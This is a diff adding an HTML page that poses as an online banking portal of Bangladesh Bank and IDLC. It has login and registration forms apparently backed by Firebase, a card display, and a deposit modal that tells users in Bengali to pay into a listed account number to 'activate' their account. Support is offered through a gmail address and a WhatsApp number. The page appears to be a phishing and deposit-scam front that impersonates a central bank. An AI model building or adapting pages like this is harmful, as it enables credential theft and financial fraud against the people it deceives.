@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <title>Bangladesh Bank-The Central Bank of Bangladesh - Bangladesh Bank-The Central Bank of Bangladesh | Dhaka IDLC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="https://uploads.onecompiler.io/44kz6hkf9/44m49q8up/1000223072.png">
+  <link rel="stylesheet" href="style.css">
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+  <script src="firebase-config.js"></script>
+</head>
+<body>
+  <nav class="navbar">
+    <div class="logo-title">
+   <img src="https://uploads.onecompiler.io/44kz6hkf9/44m49q8up/1000223072.png" class="logo-icon"/>Bank of Bangladesh IDLC</div>
+  </nav>
+  <!-- Login/Register International-->
+  <div class="main-panel" id="mainPanel">
+    <div class="form-box" id="loginBox">
+      <h2>Bangladesh Bank IDLC</h2>
+      <input id="loginUsername" type="text" placeholder="Account Number">
+      <input id="loginPassword" type="password" placeholder="Password">
+      <button class="login-btn" onclick="login()">Login A/C</button>
+      <div id="loginError" class="error"></div>
+      <div class="signup-link"><a href="#" onclick="showSignup()">Create New Account</a></div>
+    </div>
+    <div class="form-box" id="signupBox" style="display:none;">
+      <h2>Create New Account</h2>
+      <input id="signupName" type="text" placeholder="Name">
+      <input id="signupMobile" type="text" placeholder="Mobile/AC Number">
+      <input id="signupPassword" type="password" placeholder="Password">
+      <button class="login-btn" onclick="signup()">Register A/C</button>
+      <button class="login-btn" onclick="hideSignup()" style="background:#eee;color:#2367c3;">Cancel</button>
+      <div id="signupError" class="error"></div>
+    </div>
+  </div>
+  <!-- International User-->
+  <div id="userPanel" style="display:none;">
+    <nav class="navbar">
+      <div class="logo-title">Bangladesh Bank IDLC</div>
+      <button class="logout-btn" onclick="userLogout()">Logout A/C</button>
+    </nav>
+    <div class="International-ltd-container">
+      <!-- Profile Card -->
+      <div class="profile-card-flex">
+        <div class="profile-avatar">
+          <span id="userAvatar"></span>
+        </div>
+        <div class="profile-details">
+          <div class="pname" id="upName"></div>
+          <div class="pmobile" id="upMobile"></div>
+        </div>
+        <div class="p-balance">
+          <span id="upBalance"></span> BDT
+        </div>
+      </div>
+      <!-- Bank Card -->
+      <div class="bankcard-outer">
+        <img src="https://uploads.onecompiler.io/44kz6hkf9/44m49q8up/1000223085.png" class="bankcard-bg" alt="Card"/>
+        <div class="bankcard-content">
+          <div class="bankcard-row">
+            <div class="card-cvv">CVV: <span id="cardCVV"></span></div>
+            <div class="card-expiry">Expiry: <span id="cardExpiry"></span></div>
+          </div>
+          <div class="bankcard-num" id="cardNum"></div>
+          <div class="bankcard-holder" id="cardHolder"></div>
+        </div>
+      </div>
+      <!-- Actions -->
+      <div class="user-actions">
+        <button class="action-btn" onclick="showWithdrawModal()">Withdraw</button>
+        <button class="action-btn" onclick="showDepositModal()">Add Funds</button>
+        <button class="action-btn" onclick="showLiveChat()">Live Chat</button>
+      </div>
+      <!-- Withdraw Modal -->
+      <div id="withdrawModal" class="modal-panel" style="display:none;">
+        <div class="modal-content">
+          <h3>Withdraw</h3>
+          <select id="withdrawType">
+            <option value="bank">Banking</option>
+            <option value="bkash">Bkash</option>
+            <option value="card">Visa Card</option>
+            <option value="card">USDT</option>
+            <option value="mobile">Mobile Recharge</option>
+          </select>
+          <input type="text" id="withdrawTo" placeholder="Account/Mobile/Card">
+          <input type="number" id="withdrawAmt" placeholder="Amount">
+          <button class="login-btn" onclick="submitWithdraw()">Confirm</button>
+          <button class="login-btn" onclick="hideModal('withdrawModal')" style="background:#eee;color:#2367c3;">Cancel</button>
+          <div id="withdrawError" class="error"></div>
+        </div>
+      </div>
+      <!-- Deposit Modal -->
+      <div id="depositModal" class="modal-panel" style="display:none;">
+        <div class="modal-content">
+          <h3>Add Funds</h3>
+          <div class="deposit-info">
+            <div>active করতে Add মানি করুন:</div>
+            <div><b>20501781618068</b> (Bangladesh bank) IDLC</div>
+            <div>Amount, Transaction ID লিখে Submit করুন</div>
+          </div>
+          <input type="text" id="depositTxn" placeholder="Bank Transaction ID">
+          <input type="number" id="depositAmt" placeholder="Amount">
+          <button class="login-btn" onclick="submitDeposit()">Submit</button>
+          <button class="login-btn" onclick="hideModal('depositModal')" style="background:#eee;color:#2367c3;">Cancel</button>
+          <div id="depositError" class="error"></div>
+        </div>
+      </div>
+      <!-- Live Chat -->
+      <div id="liveChatBox" class="live-chat-box" style="display:none;">
+        <b>Contact Support:</b><br>
+        <a href="mailto:International@gmail.com">International@gmail.com</a><br>
+        WhatsApp: <a href="https://wa.me/16720009999" target="_blank">+1 (672) 000-9999</a>
+        <br><button class="login-btn" onclick="hideLiveChat()">Close</button>
+      </div>
+      <!-- Withdraw History -->
+      <div class="live-history-box" id="liveHistory">Loading History...</div>
+      <!-- Footer Marquee -->
+      <div class="footer-marquee-outer">
+        <div class="footer-marquee-inner">
+          <span>
+            অনলাইন ব্যাংকিং পোর্টাল পেমেন্ট করতে প্রস্তুত? <b>Bank of Bangladesh</b> বেছে নিন এবং আপনার ব্যাংক নির্বাচন করুন নিরাপদ পেমেন্ট। 
+            বিশ্বস্ত পরিচয়। Bank-The Central Bank of Bangladesh - Bangladesh অ্যাকাউন্ট-টু-অ্যাকাউন্ট পেমেন্ট সলিউশনের মাধ্যমে নির্বিঘ্ন লেনদেন এবং ১০০% সিকিউরিটি।
+          </span>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script src="app.js"></script>
+</body>
+</html>
